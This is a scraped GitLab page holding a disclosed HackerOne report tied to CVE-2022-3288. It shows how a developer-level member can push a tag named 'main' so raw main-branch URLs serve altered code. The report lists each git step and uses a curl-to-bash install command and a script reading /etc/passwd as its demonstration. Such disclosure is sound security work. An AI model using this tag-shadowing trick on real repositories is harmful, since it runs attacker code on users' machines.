=== Content from gitlab.com_cbf382ac_20250114_180951.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-3288.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-3288.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-3288.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2022/CVE-2022-3288.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Oct 17, 2022

  [361f10aa](/gitlab-org/cves/-/commit/361f10aa932bf840221489cc7dac038ee5d106a1)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/361f10aa932bf840221489cc7dac038ee5d106a1)
  ·
  361f10aa

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

  361f10aa

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/361f10aa932bf840221489cc7dac038ee5d106a1)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Oct 17, 2022

Loading



=== Content from gitlab.com_c3cb49e9_20250114_180952.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# An attacker is able to alter the information in the main branch files

An attacker is able to alter the information in the main branch files that are obtained through <https://gitlab.com/user/repo/-/raw/main/file>

**[HackerOne report #1498354](https://hackerone.com/reports/1498354)** by `st4nly0n` on 2022-03-03, assigned to [@ankelly](/ankelly "Andrew Kelly"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

# Summary

Files in the main branch of a repository can only be modified by members with high privileges within the repository and cannot be directly modified by any other user.

In this context, the use case where the user is asked to execute a script by making a **curl** request to a file located in the main branch of a repository could have unintended consequences, for example:

```
curl https://gitlab.com/user/repo/-/raw/main/install.sh | bash
```

The fact that the file being downloaded is in the main branch of the repository generates certain confidence and security in the user, since the files in the main branch are stable.

When you download a repository with the download button, you get the latest commit or file changes, however, when you push a tag with the name of the main branch for example (main) pointing to a particular commit, It will cause that when downloading the repository, `refs/tags/main` will be obtained and not `refs/heads/main`, this has the consequence that a developer can modify the content of a file in the main branch in `https://gitlab.com/user/repo/-/raw/main/install.sh` with arbitrary code that would be executed by the victim using the use case mentioned

above, i.e. getting and executing code from a file using **curl**.

# Steps to reproduce:

**[PREPARATION]**

**1.** Create a repository from gitlab.com, with main branch name main.

**2.** Add a member with developer permissions.

**3.** Clone the repository and create a `hello_world.sh` file with the following content:

```
echo 'Hello World'
```

**4.** Push the changes to the remote.

**[ATTACK]** *(Guest user in step 2)*

**5.** Clone and enter the repository created in step 1

```
git clone https:...
```

**6.** Create a new branch with the name `new-feature`

```
git checkout -b 'new-feature'
```

**7.** Edit the content of `hello_world.sh`:

```
echo 'cat /etc/passwd' > hello_world.sh
```

**8.** Push the `new-feature` branch:

```
git add .
git commit -m 'new-feature'
git push origin HEAD
```

**9.** Create a bash variable with the hash of the last commit in the `new-feature` branch

```
hash=`git rev-parse HEAD`
```

**10.** Switch to the `main` branch

```
git checkout main
```

**11.** Create a tag with the name of main pointing to the latest commit of the `new-feature` branch

```
git tag main $hash
```

**12.** Push the tags to the remote:

```
git push origin --tags
```

**13.** Remove the `new-feature` branch from the remote:

```
git push -d origin 'new-feature'
```

As a result of this behavior an attacker can manage to change the code of the files in the main branch, causing arbitrary commands to be executed if the victim uses the use case of executing code by making a request to the file url via **curl**.

# What is the current *bug* behavior?

When a tag is pushed with the name of the main branch for example (main) that points to a particular commit, it will cause `refs/tags/main` and not `refs/heads/main` to be obtained when downloading the repository.

# What is the expected *correct* behavior?

The file at `https://gitlab.com/user/repo/-/raw/main/file.sh` should not be modified by pushing a tag with the main branch name.

# Relevant logs and/or screenshots

In the proof of concept video it is shown how the victim uses the use case where he executes the code of a file in the main branch through **curl** obtaining the expected result, however, an attacker was able to change the content of the file from the main branch, now the victim when executing the same command gets an unexpected result.

[poc.mp4](https://user-content.gitlab-static.net/93bdf44ea78c5d4f41600888cab89f1d4f425915/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63663037353530362d383264392d346534642d383038332d3463373963313166646238662f706f632e6d7034 "Download 'poc.mp4'")

# Output of checks

This bug happens on GitLab.com

#### Impact

An attacker is able to change the content of a main branch file by pushing a tag with the main branch name, this results in the execution of arbitrary commands by the victim using **curl** to execute code from a main branch. file in the main branch.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [poc.mp4](https://h1.sec.gitlab.net/a/cf075506-82d9-4e4d-8083-4c79c11fdb8f/poc.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Jun 21, 2022 by [Sean Carroll](/sean_carroll)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


